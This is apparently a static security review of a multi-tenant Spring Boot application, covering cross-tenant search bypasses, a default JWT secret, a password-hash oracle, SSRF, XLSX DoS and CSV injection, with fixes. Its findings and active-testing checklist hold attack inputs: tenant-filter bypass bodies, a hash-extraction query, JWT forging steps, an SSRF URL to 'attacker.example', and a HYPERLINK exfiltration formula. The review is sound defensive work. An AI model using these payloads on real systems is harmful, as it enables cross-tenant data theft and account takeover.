# Security review — Input handling & leakage

Scope: read-only static review of `F:/oosm` (Spring Boot 3.4.4, Java 21 modular monolith).
Areas: Excel/CSV import & export, document generation, SQL/filter construction, file upload/download,
outbound requests (SSRF), deserialization, error/log leakage, CORS, configuration defaults.
No code was executed, no network requests were made. Secret values are truncated to the first
characters followed by `…`.

## Summary

| ID | Severity | Title |
|----|----------|-------|
| INPUT-01 | critical | Cross-tenant read through client-controlled `filterTenant` / `operation: OR` / `reverse` in generic advanced search and exports |
| INPUT-02 | critical | Hard-coded default HS256 JWT secret in `application.yml` (Render blueprint does not set `JWT_SECRET`) — needs verification on live envs |
| INPUT-03 | high | Arbitrary entity property paths in search filters and sort → password-hash / token extraction oracle |
| INPUT-04 | high | Default bootstrap admin credentials, enabled by default, with `reset-existing-admin-password: true` — needs verification |
| INPUT-05 | medium | SSRF in mobile offline sync (`internalBaseUrl + request.url`, `@` host confusion, any method, no timeouts) |
| INPUT-06 | medium | XLSX import DoS: DOM parsing with POI default zip-bomb limits + full formula re-evaluation on a 256 MB heap with `ExitOnOutOfMemoryError` |
| INPUT-07 | medium | CSV / formula injection in CSV exports (generic exporter and day-import report) |
| INPUT-08 | medium | Raw exception messages (incl. SQL/constraint details) returned to clients |
| INPUT-09 | medium | Native/derived queries without tenant predicate (filtration operations, HR compliance) — needs verification |
| INPUT-10 | low | CORS trusts shared-hosting wildcards and `http://localhost:*` with `allowCredentials=true`; admin setting accepts over-broad patterns |
| INPUT-11 | low | Unencoded user-supplied filename in `Content-Disposition` and ZIP entry names of exports |
| INPUT-12 | low | Unbounded page `size` and `toCalculateTotal` load whole result sets into memory |
| INPUT-13 | low | Google Drive OAuth `state` not bound to the initiating user; non-constant-time compare; secret fallback |
| INPUT-14 | low | HTML e-mail templates interpolate values without HTML escaping |
| INPUT-15 | low | Insecure / risky configuration defaults (ddl-auto update, sql init always, springdoc default on, health details selectable to `always`, DB default password, legacy YAMLs in jar) |
| INPUT-16 | low | Java native deserialization of OAuth2 authorization metadata from DB (defense in depth) |
| INPUT-17 | info | Sensitive values reachable in DEBUG logs (method-entry argument dumps, 3-digit reset-code prefix) |
| INPUT-18 | info | Outdated document/spreadsheet libraries (POI 5.2.3, iText 2.1.7 `com.lowagie`, itextpdf 5.5.13.3) |
| INPUT-19 | info | Day-import `GET /runs/{id}` and `/runs/{id}/report` skip the `DayImportAccess` permission check (tenant-scoped, so no cross-tenant leak) |

---

## Findings

### INPUT-01 — Cross-tenant read through client-controlled `filterTenant` / `OR` / `reverse` in generic advanced search and exports

**Severity:** critical — any authenticated user of any tenant can read (and export) every tenant's records for every entity exposed through `BaseController`, including users.

**Evidence**

- `modules/shared-kernel/src/main/java/com/xdev/ooms/sharedkernel/models/SearchData.java:11` — tenant filtering is a request field:
  ```java
  private boolean filterTenant =true;
  ```
- `modules/shared-kernel/src/main/java/com/xdev/ooms/sharedkernel/services/impl/BaseServiceImpl.java:439-488`
  ```java
  if (searchData.isFilterTenant()) {
      SearchDetails details = new SearchDetails();
      details.setEqualValue(TenantContext.getCurrentTenant());
      ...
          searchData.getSearchData().getSearch().put("tenantId", details);
  ...
  } else {
      result = repository.findAllByIsDeletedFalse(pageable);     // line ~479: all tenants
  ```
- The tenant predicate is only *one more predicate* inside the client's `SearchModel`, combined with the client's `operation` and `reverse`:
  `modules/shared-kernel/src/main/java/com/xdev/ooms/sharedkernel/services/utils/SearchSpecificationBuilder.java:94-103`
  ```java
  if (searchModel.getOperation() == SearchOperation.AND) {
      combined = criteriaBuilder.and(predicateArray);
  } else {
      combined = criteriaBuilder.or(predicateArray);
  }
  Predicate finalResult = searchModel.isReverse() ? criteriaBuilder.not(combined) : combined;
  ```
  So `{"searchData":{"operation":"OR","search":{"id":{"null":false}}}}` or `{"searchData":{"reverse":true}}` escapes the tenant filter even when `filterTenant=true`.
- Same pattern in exports: `BaseServiceImpl.java:526-531, 827-830, 1167-1170` (`exportToPdf/Csv/Excel`).
- Endpoints: `modules/shared-kernel/src/main/java/com/xdev/ooms/sharedkernel/controllers/BaseController.java:55-64` → `POST {base}/advanced/search`, `/export/pdf|csv|excel`.
- No DB-level safety net: no Hibernate `@Filter`/`@TenantId` anywhere in the repo. `UserService.search` (`modules/security/.../user/service/UserService.java:97-103`) only calls `assertCanListUsers()` then `super.search(...)`.
- Spec path also ignores `isDeleted` (soft-deleted rows are returned).

**Impact:** full multi-tenant confidentiality break (suppliers, sales, payroll/HR, users with e-mails/phones, etc.). Combined with INPUT-03, can extract password hashes of users in other tenants.

**Recommended fix:** remove `filterTenant` from the request contract (make it a server-side decision per resource, e.g. only for platform super-admin). Build the final specification as `Specification.where(tenantEquals(current)).and(notDeleted()).and(clientSpec)` so the client spec can never be OR-ed or negated with the tenant predicate. Ignore/strip any client key `tenantId`. Consider a Hibernate `@Filter`/`@TenantId` as defense in depth. Add tests for `OR`, `reverse`, `filterTenant=false`.

**Effort:** M

---

### INPUT-02 — Hard-coded default HS256 JWT secret (needs verification on live envs)

**Severity:** critical — if any deployment runs without `JWT_SECRET`, anyone can forge access tokens for any user/tenant/role.

**Evidence**

- `app/src/main/resources/application.yml:112-114`
  ```yaml
  security:
    jwt:
      secret: ${JWT_SECRET:X7kP…}
  ```
- Tokens are HS256 with this secret: `modules/security/.../securityConfig/SecurityConfig.java:70-75`, `JwtKeyLoader.java:27-33` (only checks non-empty).
- Tenant and role come from JWT claims (`TenantFilter.java:30-41`, `SecurityConfig.java:86-99`).
- `render.yaml` env list (lines 13-120) does **not** define `JWT_SECRET`; `RAILWAY_TESTING.md:68` states local dev uses the default.
- `application.yml:129` — `APP_SETTINGS_ENCRYPTION_KEY` falls back to the JWT secret, so the same default also decrypts stored secrets (SMTP, FCM key, Drive refresh tokens).

**Impact:** complete authentication bypass and decryption of stored integration secrets.

**Recommended fix:** remove the default (`${JWT_SECRET}` with no fallback) and fail startup if it is missing, shorter than 32 bytes, or equal to the known dev value. Add `JWT_SECRET` and `APP_SETTINGS_ENCRYPTION_KEY` (separate values) as `sync: false` in `render.yaml`. Rotate the secret on every environment that may have used the default.

**Effort:** S

---

### INPUT-03 — Arbitrary property paths in search filters and sort → password-hash / token extraction oracle

**Severity:** high — search keys and sort fields are resolved against the JPA entity (not the DTO), so hidden columns such as `OOSMUser.password` (bcrypt hash) can be filtered with `LIKE` and extracted character by character.

**Evidence**

- `SearchSpecificationBuilder.java:141` and `625-635`
  ```java
  Path<?> path = getNestedPropertyPath(root, key);
  ...
  for (String part : parts) { path = path.get(part); }
  ```
- `SearchSpecificationBuilder.java:158-160` — `likeValue` on any String attribute.
- Sort field is taken verbatim: `BaseServiceImpl.java:437-438` (`PageRequest.of(page, size, direction, sort)`) and `BaseServiceImpl.java:216-217` (`fetchAllPageable`).
- Sensitive entity attributes exist: `modules/security/.../user/entity/OOSMUser.java:30` (`password`), `:39` (`fcmToken`); `authorization/entity/Authorization.java:41` (`refreshTokenValue`).
- Example: `POST /api/security/user/advanced/search` with `{"searchData":{"search":{"password":{"likeValue":"$2a$10$a"}}}}` → result count reveals whether the hash contains the prefix.

Note: Spring Data validates the property path, so this is **not** SQL injection in `ORDER BY`; it is an information oracle.

**Impact:** offline cracking of password hashes (including platform admins when combined with INPUT-01); leaking FCM tokens.

**Recommended fix:** per-entity allowlist of searchable/sortable properties (derived from the OUT DTO or an explicit annotation). Reject unknown keys with 400. Mark secrets `@JsonIgnore` and exclude them from the allowlist.

**Effort:** M

---

### INPUT-04 — Default bootstrap admin credentials enabled by default (needs verification)

**Severity:** high — a predictable super-admin password is (re)applied at every startup unless every env overrides it.

**Evidence**

- `app/src/main/resources/application.yml:117-123`
  ```yaml
  bootstrap:
    enabled: ${SECURITY_BOOTSTRAP_ENABLED:true}
    username: ${SECURITY_BOOTSTRAP_USERNAME:oosmAdmin}
    password: ${SECURITY_BOOTSTRAP_PASSWORD:oosm…}
    reset-existing-admin-password: ${SECURITY_BOOTSTRAP_RESET_PASSWORD:true}
  ```
- `render.yaml:81-82` sets `SECURITY_BOOTSTRAP_ENABLED: "true"`; password is `sync: false` (must be typed in the dashboard). `modules/security/.../SecurityBootstrap.java:148` logs "Reset bootstrap password".
- `scripts/setup-local-login.ps1:34` and `RENDER_DEPLOYMENT.md:66` document default-looking values.

**Impact:** takeover of the platform admin account; also silently reverts any password change the admin makes after each restart.

**Recommended fix:** default `enabled=false` and `reset-existing-admin-password=false`; require an explicit password with a strength check when enabled; force password change at first login; disable after first successful bootstrap.

**Effort:** S

---

### INPUT-05 — SSRF in mobile offline sync

**Severity:** medium — any authenticated user can make the server send requests with an arbitrary method/body to an attacker-chosen host (blind), and tie up Tomcat threads.

**Evidence**

- `modules/conditioning/src/main/java/com/xdev/ooms/conditioning/sync/controller/MobileSyncController.java:24-33` — `POST /api/ordreConditionement/mobile/sync`, body `SyncRequestDto`.
- `modules/conditioning/.../sync/service/SyncService.java:62, 80-85`
  ```java
  String fullUrl = internalBaseUrl + request.getUrl();
  ...
  restTemplate.exchange(fullUrl, HttpMethod.valueOf(request.getMethod().toUpperCase()), entity, String.class);
  ```
  `internalBaseUrl` defaults to `http://127.0.0.1:${PORT}` (`application.yml:111`). A `url` of `@attacker.example/x` yields `http://127.0.0.1:8084@attacker.example/x` → host `attacker.example` (userinfo confusion). Paths like `/../` or other internal endpoints are also reachable. The caller's bearer token is attached (their own token, so low value by itself, but still sent to a third party).
- `modules/shared-kernel/.../config/RestTemplateConfig.java:12` — `new RestTemplate()` with no connect/read timeout; `server.tomcat.threads.max` defaults to 20 (`application.yml:8`).

**Impact:** blind SSRF to internal/private-network services (Railway/Render private networking, metadata endpoints) with attacker-controlled method and JSON body; thread-pool exhaustion (DoS) by pointing at a slow host.

**Recommended fix:** accept only a relative path, validate with `URI` that it has no scheme/authority/userinfo, starts with `/api/`, and matches an allowlist of sync-able endpoints/methods. Better: dispatch internally (call the service layer or `DispatcherServlet` forward) instead of HTTP. Configure a `RestTemplate` with short timeouts and redirects disabled.

**Effort:** M

---

### INPUT-06 — XLSX import DoS (DOM parsing, POI default zip-bomb limits, formula re-evaluation)

**Severity:** medium — a small crafted workbook can exhaust the 256 MB heap; the JVM is configured to exit on OOM, restarting the only instance.

**Evidence**

- `modules/production/.../dayimport/service/DayImportWorkbookReader.java:25` — `new XSSFWorkbook(in)` (full XMLBeans DOM, not streaming).
- `DayImportWorkbookReader.java:30, 86-100` — evaluates **every** formula cell in the uploaded workbook:
  ```java
  FormulaEvaluator evaluator = workbook.getCreationHelper().createFormulaEvaluator();
  ... evaluator.evaluateFormulaCell(cell);
  ```
- No `ZipSecureFile` / `IOUtils.setByteArrayMaxOverride` tuning anywhere (repo-wide grep). POI 5.2.3 defaults: min inflate ratio 0.01 (100:1), max entry size ~4 GB, max text size 10 M chars.
- Size gates: controller `DayImportController.java:90-95` (20 MB, `.xlsx` suffix only); no `spring.servlet.multipart.*` in `application.yml`, so Spring's implicit 1 MB file / 10 MB request limit applies (the 20 MB check is effectively dead for uploads). The Google Drive path accepts up to 20 MB (`DayImportDriveService.java:131-132`) and downloads the file up to three times (`:117, :131, :140`).
- `render.yaml:15` — `-Xmx256m ... -XX:+ExitOnOutOfMemoryError`.
- The workbook is parsed several times per request (`DayImportService.authorize` `:207-209`, preview, commit).

Formula evaluation does not reach the network: POI does not implement `WEBSERVICE`, and external workbook links fail unless explicitly configured. XXE is mitigated by POI 5's hardened XML parsers.

**Impact:** any user with import permission (or anyone who can drop a file into the tenant's Drive folder) can crash the service; CPU exhaustion via expensive array formulas.

**Recommended fix:** set explicit `spring.servlet.multipart.max-file-size`/`max-request-size` consistent with the controller check; tighten `ZipSecureFile.setMinInflateRatio` (e.g. 0.05), `setMaxEntrySize` (e.g. 50 MB) and `IOUtils.setByteArrayMaxOverride`; cap sheets/rows/columns before processing; do not re-evaluate formulas except the known template columns (or evaluate only cells in known columns); parse once per request; consider a bounded executor for imports.

**Effort:** M

---

### INPUT-07 — CSV / formula injection in CSV exports

**Severity:** medium — user-entered strings starting with `=`, `+`, `-`, `@`, tab or CR are written verbatim into CSV files that users open in Excel.

**Evidence**

- Generic exporter used by every `BaseController` resource: `modules/shared-kernel/.../services/impl/BaseServiceImpl.java:984-1003`
  ```java
  csv.append("\"").append(fieldsToExport.get(i).getLabel()).append("\"");   // header label from request, quotes not escaped
  ...
  value = value.replace("\"", "\"\"");
  csv.append("\"").append(value).append("\"");
  ```
- Day-import report: `modules/production/.../dayimport/service/DayImportReportExporter.java:39-53, 131-133` — `businessKey`, `message` (which can echo workbook values) quoted but not neutralised.
- Quoting does not prevent Excel from evaluating `"=HYPERLINK(...)"`/`"=cmd|..."`.
- XLSX exports are safe: `DayImportReportExporter.java:90-100` and `BaseServiceImpl.java:1356-1358` use `setCellValue(String)` (string cell type, never formulas).

**Impact:** a low-privileged user (or supplier data imported from a workbook) can plant payloads that run when an admin/accountant opens the export (data exfiltration via hyperlinks, DDE on legacy Excel).

**Recommended fix:** in both CSV writers, prefix cells whose first char is one of `= + - @ \t \r` with `'` (OWASP guidance), escape quotes in header labels too; prefer Apache Commons CSV (already a dependency) for correct quoting.

**Effort:** S

---

### INPUT-08 — Raw exception messages returned to clients

**Severity:** medium — Hibernate/PostgreSQL messages (constraint names, column names, conflicting key values such as another tenant's e-mail) and internal errors are returned in API responses.

**Evidence**

- `modules/inventory/.../exception/GlobalExceptionHandler.java:32-39` — every `RuntimeException` in inventory (incl. `DataIntegrityViolationException`, NPE) → HTTP 400 with `ex.getMessage()`.
- Controllers catching `Exception` and echoing the message, e.g.
  - `modules/production/.../qualitycontrol/controller/QualityControlResultController.java:53, 98, 119, 136, 153` — `"Unexpected error: " + e.getMessage()`
  - `modules/conditioning/.../ordrefabrication/controller/OFController.java:123`, `shipping/controller/ShippingInfoController.java:116`, `expedition/controller/ExpeditionController.java:173` — `"Erreur interne: " + e.getMessage()`
  - `modules/security/.../role/controller/RoleController.java:81`, `production/.../oiltransaction/controller/OilTransactionController.java:95`, `production/.../planning/controller/PlanningController.java:64-186`, `inventory/.../stocksec/controller/StockSecController.java:48-227`, `production/.../filtration/controller/FiltrationController.java:44-215`, `conditioning/.../sync/controller/MobileSyncController.java:31`.
- `modules/shared-kernel/.../utils/ExceptionHandler.java:154-155` returns `IllegalArgumentException` messages (acceptable if messages are curated).
- Global Spring settings are good (`server.error.include-message: never`, stack traces never included) — but these handlers bypass them.

**Impact:** schema disclosure and cross-tenant existence oracles (e.g. "Key (email)=(x@y) already exists").

**Recommended fix:** one `@RestControllerAdvice` mapping known business exceptions to curated messages and everything else to a generic message + correlation id (already generated by `OOSMLogger`); remove per-controller `catch (Exception e) { body(e.getMessage()) }`.

**Effort:** M

---

### INPUT-09 — Queries without tenant predicate (needs verification)

**Severity:** medium — some repository methods return rows from all tenants and are used by analytics/HR endpoints.

**Evidence**

- `modules/production/.../filtration/repository/FiltrationOperationRepo.java:23-36` — native queries with only `is_deleted = false` (no `tenant_id`), e.g.
  ```java
  @Query(value = "SELECT * FROM filtration_operation WHERE is_deleted = false ORDER BY operation_date DESC", nativeQuery = true)
  ```
  Used by `production/.../analytics/service/ProdAnalyticsService.java:28`, `conditioning/.../analytics/service/AnalyticsService.java:219`, `production/.../filtration/service/FiltrationService.java:448`.
- `modules/hr/.../compliance/repository/HrComplianceViolationRepository.java:18` `findByStatusAndIsDeletedFalse` used in `HrComplianceController.java:60` and `HrAgentToolRegistry.java:114`.
- Verify whether callers filter by tenant afterwards (not visible at call sites reviewed).

**Impact:** cross-tenant disclosure of operational/HR data in reports.

**Recommended fix:** add `tenant_id = :tenantId` to every tenant-scoped query (or central Hibernate filter); add an ArchUnit/test rule that repository methods on tenant entities must take a tenant parameter.

**Effort:** S–M

---

### INPUT-10 — CORS trusts shared-hosting wildcards and localhost with credentials

**Severity:** low — origins anyone can register (`*.onrender.com`, `*.railway.app`) are trusted with `allowCredentials=true`; impact is limited today because auth uses bearer tokens, not cookies.

**Evidence**

- `modules/security/.../securityConfig/DynamicCorsConfigurationSource.java:26-36, 51, 63`
  ```java
  "http://localhost:*", "http://127.0.0.1:*",
  "https://*.up.railway.app", "https://*.railway.app", "https://*.onrender.com",
  ...
  cors.setAllowedOriginPatterns(allowedOriginPatterns);
  cors.setAllowCredentials(true);
  ```
- `CorsConfig.java:10-13` just exposes this source. `exposedHeaders` includes `Authorization`.
- Admin-configurable patterns: `modules/shared-kernel/.../settings/service/AppSettingValidator.java:41-47` rejects only the literal `*`; `https://*`, `https://*.com`, `http://*` are accepted.
- No `endsWith`-style bypass: Spring's pattern matcher anchors host patterns; `https://www.x-dev.pro` / `https://x-dev.pro` are exact. `/oauth2/**` chain uses `SessionCreationPolicy.IF_REQUIRED` (`AuthServerConfig.java:151`) — verify no session cookie is issued.

**Impact:** any page on a Render/Railway subdomain or local port can make credentialed cross-origin calls and read responses; becomes high if cookie/session auth is ever introduced.

**Recommended fix:** remove platform wildcards and `localhost:*` from production (profile-gate them); list exact frontend origins; in the validator reject any pattern containing `*` in the scheme/host except a single leading `*.` on an owned domain; set `allowCredentials=false` unless cookies are needed.

**Effort:** S

---

### INPUT-11 — Unencoded user-supplied filename in `Content-Disposition` and ZIP entries

**Severity:** low — Tomcat strips CR/LF (no header splitting), but quotes/semicolons let the client-controlled `fileName` change the downloaded name/extension; ZIP entry names can contain `../`.

**Evidence**

- `modules/shared-kernel/.../controllers/impl/BaseControllerImpl.java:439-440, 479-481, 524-526`
  ```java
  headers.set(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + fileName + "\"");
  ```
  `fileName` comes from the `ExportDetails` request body.
- `BaseServiceImpl.java:939-940, 1265-1270` — `new ZipEntry(safeFileName + "_part_...")` with `safeFileName` = raw `fileName`.
- Document controllers do this correctly with `ContentDisposition.builder().filename(...)` (`documents/DocumentController.java:45-48`, `finance/.../BillController.java:79`).

**Impact:** content spoofing of downloads (e.g. `.html`/`.exe` names), zip-slip on naive extractors.

**Recommended fix:** sanitise to `[A-Za-z0-9._-]{1,100}` and use `ContentDisposition.attachment().filename(name, UTF_8)`; same sanitised name for ZIP entries.

**Effort:** S

---

### INPUT-12 — Unbounded page size and totals load entire result sets

**Severity:** low — authenticated memory/CPU DoS on a 256 MB instance.

**Evidence**

- `BaseServiceImpl.java:435` — `size` accepted as any positive integer.
- `BaseServiceImpl.java:460-464, 471-474, 480-483` — when `toCalculateTotal` is non-empty the whole matching set is loaded (`PageRequest.of(0, totalElements)`); with INPUT-01 that is every tenant's rows. Field names for totals are resolved by reflection on the entity (`getNestedFieldValue`, `:494-499`).

**Recommended fix:** cap `size` (e.g. ≤ 200), compute totals with `SUM` aggregate queries on allowlisted numeric fields.

**Effort:** S–M

---

### INPUT-13 — Google Drive OAuth `state` not bound to initiating user

**Severity:** low — an attacker can send their own tenant's authorize URL to a victim; if the victim consents, the victim's Google Drive refresh token is stored for the attacker's tenant (account-linking CSRF). Requires the victim to accept a Google consent screen.

**Evidence**

- `modules/production/.../dayimport/service/GoogleDriveOAuthService.java:237-243` — state = `tenantId.nonce.timestamp.hmac`; nonce is not persisted or tied to the user/session.
- `:254` — `expected.equals(parts[3])` (non-constant-time).
- `:271` — HMAC key falls back to `clientSecret|clientId` if `state-secret` is unset.

**Recommended fix:** persist the nonce server-side with the initiating user id and single-use semantics; use `MessageDigest.isEqual`; require a dedicated `state-secret`.

**Effort:** S

---

### INPUT-14 — HTML e-mail templates without escaping

**Severity:** low — values such as `USERNAME` and company/branding fields are inserted into HTML e-mails raw.

**Evidence**

- `modules/shared-kernel/.../mail/templates/EmailTemplateRenderer.java:15-21, 31-33`
  ```java
  rendered = rendered.replace("{{" + entry.getKey() + "}}", safe(entry.getValue()));   // safe() only null-checks
  ```
- Callers: `OosmMailComposer.java:50-58, 101-109, 155-163`.

**Impact:** HTML/link injection into official e-mails (phishing from a trusted sender) by whoever controls those fields (tenant admins).

**Recommended fix:** HTML-escape every variable (`HtmlUtils.htmlEscape`) except explicitly trusted URLs, which should be validated as `https://` on the configured frontend host.

**Effort:** S

---

### INPUT-15 — Insecure / risky configuration defaults

**Severity:** low — each item is individually minor but they compound on a fresh or misconfigured deployment.

**Evidence** (`app/src/main/resources/application.yml` unless noted)

- `:33` DB password default `r…` (`${DB_PASS:${PGPASSWORD:r…}}`).
- `:51` `ddl-auto: ${HIBERNATE_DDL_AUTO:update}`; `render.yaml:24-25` sets `update` in production.
- `:70` `spring.sql.init.mode: always` by default (Render overrides to `never`).
- `:138-143` `springdoc.api-docs.enabled: ${SPRINGDOC_ENABLED:true}`, `swagger-ui.enabled: true`, `show-actuator: true`. Mitigated: `/v3/api-docs` requires `OOSMADMIN` (`AuthServerConfig.java:106-123`) and Render sets `SPRINGDOC_ENABLED=false`.
- `modules/shared-kernel/.../settings/definition/AppSettingDefinitionRegistry.java:17, 96-98` — admins can set `HEALTH_SHOW_DETAILS=always` on the **public** `/actuator/health` (`AuthServerConfig.java:79-81`), exposing DB/disk details.
- Legacy microservice configs packaged in the jar (not loaded, but misleading and include `management.endpoints.web.exposure.include: *`, `show-details: always`, default DB/mail passwords):
  `modules/finance/src/main/resources/legacy/osm-fin/application.yml:11, 28, 134-136`,
  `modules/inventory/src/main/resources/legacy/osm-pack/application.yml:19, 35, 104-106`,
  `modules/conditioning/src/main/resources/legacy/osm-cond/application.yaml:19, 35, 104-106`,
  `modules/production/src/main/resources/legacy/osm-prod/application.yml:31, 54, 145-149`.
- No prod profile file exists; production safety depends entirely on env vars.

**Recommended fix:** secure-by-default values in `application.yml` (`ddl-auto: validate`, springdoc off, sql init never), an `application-prod.yml` that fails on missing secrets, restrict `HEALTH_SHOW_DETAILS` to `never|when_authorized`, delete or move `legacy/` resources out of `src/main/resources`.

**Effort:** S

---

### INPUT-16 — Java native deserialization of OAuth2 metadata from DB

**Severity:** low — not reachable from HTTP input; only exploitable by someone who can already write the `authorization` table, but `ObjectInputStream` without a filter is a known gadget sink.

**Evidence**

- `modules/security/.../securityConfig/services/JpaOAuth2AuthorizationService.java:238-247`
  ```java
  ObjectInputStream in = new ObjectInputStream(byteIn);
  Map<String, Object> parsed = (Map<String, Object>) in.readObject();
  ```

**Recommended fix:** serialise metadata as JSON with the already-configured `SecurityJackson2Modules` ObjectMapper (as Spring's `JdbcOAuth2AuthorizationService` does), or at least set an `ObjectInputFilter` allowlist.

**Effort:** S

---

### INPUT-17 — Sensitive values reachable in DEBUG logs

**Severity:** info — defaults are INFO and runtime-toggleable levels are limited to `org.springframework.web` and `RestTemplate`, so exposure requires a deliberate config change.

**Evidence**

- `modules/shared-kernel/.../utils/OOSMLogger.java:158-178` — `logMethodEntry` dumps `toString()` of all arguments at DEBUG (e.g. `BaseServiceImpl.java:235, 299` DTOs; `SearchSpecificationBuilder.java:153, 162` filter values). DTOs use default `Object.toString`, so today little is leaked, but any Lombok `@Data` added later would dump passwords.
- `modules/security/.../user/service/UserService.java:695-696` — logs first 3 digits of the 6-digit reset code at DEBUG.
- `AppSettingDefinitionRegistry.java:87-92` — admins can set `org.springframework.web` / `RestTemplate` to TRACE (RestTemplate TRACE logs request bodies, e.g. mobile sync payloads).

**Recommended fix:** never log code fragments; mask known sensitive DTO fields centrally; cap runtime-selectable levels at DEBUG for framework loggers.

**Effort:** S

---

### INPUT-18 — Outdated document/spreadsheet libraries

**Severity:** info — no exploitable path found, but versions carry known advisories.

**Evidence**

- `pom.xml:29` — `poi.version 5.2.3` (CVE-2025-31672, OOXML duplicate-entry parsing inconsistency, fixed in 5.4.0).
- `modules/conditioning/pom.xml:25-26` — `com.lowagie:itext 2.1.7` (unmaintained; CVE-2017-9096 XXE in its XML/HTML parsers — not used here, only programmatic `PdfPTable`, `conditioning/.../reporting/service/PdfReportService.java:3-6`).
- `pom.xml:27` — `itextpdf 5.5.13.3` (EOL, AGPL licensing).
- `modules/inventory/src/main/java/com/osm/inventory_service/service/PdfGeneratorService.java:5-17` imports iText 7 classes (legacy package; verify it is compiled/used).

**Recommended fix:** upgrade POI to ≥ 5.4.x; replace iText 2.1.7 with the iText 5/OpenPDF already used elsewhere; remove dead legacy code.

**Effort:** S–M

---

### INPUT-19 — Day-import run endpoints skip the permission check

**Severity:** info — reads are tenant-scoped (`DayImportLedger.java:77` `WHERE id=? AND tenant_id=?`), so only users of the same tenant without import permission can read reports.

**Evidence**

- `modules/production/.../dayimport/controller/DayImportController.java:40-48` — `run()` and `savedReport()` do not call `DayImportAccess.requireImport()` unlike every other endpoint.

**Recommended fix:** add `DayImportAccess.requireImport()` to both handlers.

**Effort:** S

---

## Areas reviewed with no finding

- **Template engines / SSTI:** none present (no Thymeleaf, FreeMarker, Velocity, Jasper, docx4j, SpEL `parseExpression`, `ScriptEngine`). All PDFs are built programmatically with iText (`documents/**`), so user input cannot reach a template or expression.
- **HTML-to-PDF / SSRF via `<img src>`:** no `HTMLWorker`/`XMLWorker`/Flying Saucer; `Image.getInstance` is only called with decoded bytes (company logo), never with URLs (`ExpeditionPdfGeneratorService.java:293-303`, `PaymentNotePdfGeneratorService.java:254`).
- **SQL injection:** all `JdbcTemplate` calls in `DayImportLedger`, `DayImportDriveStore`, `ClientRegistry` are parameterised; dynamic identifiers in `TenantLifecycleService.java:168` come from `information_schema` and are quoted; migration runners use catalog-derived names; `ORDER BY` uses Spring Data `Sort` (property-validated).
- **File upload/storage:** only the day-import XLSX upload exists; it is processed in memory and never written to disk, so no path traversal and nothing lost on Render/Railway's ephemeral FS. User photos are base64 in DB with type allowlist and size estimate (`UserService.java:57, 896-903`).
- **Deserialization:** no `activateDefaultTyping`, XStream, SnakeYAML on user input; the only polymorphic type (`inventory/config/ArticleConfig.java:6-17`) uses `JsonTypeInfo.Id.NAME` with a closed subtype list.
- **Outbound TLS:** no custom `TrustManager`/`HostnameVerifier`; Google/FCM endpoints are fixed hosts; Drive `fileId`/folder IDs come from Google API responses and are URL-encoded where used as query params.

## Things to verify with active testing (local instance, e.g. `http://localhost:8084`)

Use two tenants `A` and `B`, each with a normal user; `$TA` = token of a tenant-A user.

1. **INPUT-01 `filterTenant`:**
   `curl -s -H "Authorization: Bearer $TA" -H 'Content-Type: application/json' -d '{"filterTenant":false,"page":0,"size":50}' http://localhost:8084/api/<any-base-resource>/advanced/search` → expect only tenant-A rows; currently expect tenant-B rows too.
2. **INPUT-01 OR/reverse:** same endpoint with `{"searchData":{"operation":"OR","search":{"id":{"null":false}}}}` and with `{"searchData":{"reverse":true,"search":{}}}` → check for tenant-B rows. Repeat on `/export/csv`.
3. **INPUT-01 users:** as a tenant admin, `POST /api/security/user/advanced/search` with `{"filterTenant":false}` → check for other tenants' users.
4. **INPUT-03 oracle:** `{"searchData":{"search":{"password":{"likeValue":"$2a$"}}}}` on the user search → non-zero `total` confirms; also `"sort":"password"`.
5. **INPUT-02:** start without `JWT_SECRET`, sign an HS256 JWT with the default secret containing `oosmUser.tenantId` of tenant B and `role: OOSMADMIN`, call `GET /api/security/user/fetchAll` → expect 401 after fix. Also on the live Render/Railway services, confirm `JWT_SECRET` and `APP_SETTINGS_ENCRYPTION_KEY` are set and distinct (dashboard only; do not test live).
6. **JWKS:** `GET /oauth2/jwks` must not contain a `"k"` member (symmetric key exposure).
7. **INPUT-04:** fresh DB without `SECURITY_BOOTSTRAP_PASSWORD` → attempt login as `oosmAdmin` with the documented default; change the password, restart, retry old default.
8. **INPUT-05 SSRF:** run `nc -l 9999` locally, then `POST /api/ordreConditionement/mobile/sync` with `{"operationId":"t1","url":"@127.0.0.1:9999/x","method":"POST","body":"{}"}` → observe the inbound request (and `Authorization` header) on the listener. Also point at a non-responding host and measure thread blocking.
9. **INPUT-06:** upload an `.xlsx` < 1 MB whose `sheet1.xml` inflates close to 100× (e.g. 1 M rows of repeated inline strings) to `POST /api/production/import/day/dry-run` with `-Xmx256m -XX:+ExitOnOutOfMemoryError`; then a workbook with `=SUMPRODUCT(A1:A1048576*B1:B1048576)` in many cells; watch heap/CPU. Also confirm uploads > 1 MB are rejected with `MaxUploadSizeExceededException` (multipart defaults).
10. **INPUT-07:** create a supplier named `=HYPERLINK("http://127.0.0.1:9999/?x="&A2,"click")`, export via `/export/csv`, open in Excel/LibreOffice.
11. **INPUT-08:** create two records violating a unique constraint in inventory (e.g. duplicate code) → inspect response for `ERROR: duplicate key ... Detail: Key (...)=(...)`.
12. **INPUT-10 CORS:** `curl -i -X OPTIONS -H 'Origin: https://evil.onrender.com' -H 'Access-Control-Request-Method: GET' http://localhost:8084/api/security/user/me` → `Access-Control-Allow-Origin: https://evil.onrender.com` + `Allow-Credentials: true` confirms. Also check whether `/oauth2/token` responses set `JSESSIONID`.
13. **INPUT-11:** `POST /export/csv` with `"fileName":"a.html\"; x=\"y"` → inspect `Content-Disposition`.
14. **INPUT-12:** `{"size":1000000,"toCalculateTotal":["id"]}` on a large table → observe heap.
15. **INPUT-09:** as tenant A, call the production/conditioning filtration analytics endpoints and `GET` HR compliance violations → check for tenant-B rows.
16. **Error defaults:** trigger an unhandled exception on a non-inventory endpoint → response must not contain `trace`/`message` (confirms `server.error.*`).

## What is done well

- XLSX exports write strings with `setCellValue(String)` — no formula injection in spreadsheet exports.
- POI 5.x XML parsing is XXE-hardened; POI formula evaluation has no network-capable functions.
- No template engines or HTML-to-PDF, which removes SSTI and PDF-SSRF classes entirely.
- JDBC access is consistently parameterised; the day-import ledger/run tables are tenant-scoped in every query.
- Tenant is derived only from the signed JWT (`TenantFilter.java`); the `X-Tenant-ID` header override is disabled.
- `server.error.include-message/binding-errors: never`; no stack traces returned anywhere; exceptions are logged with correlation ids.
- Actuator exposes only `health,info`, `show-details: never` by default, liveness/readiness groups hide details.
- `/v3/api-docs` requires `OOSMADMIN`; Render sets `SPRINGDOC_ENABLED=false`.
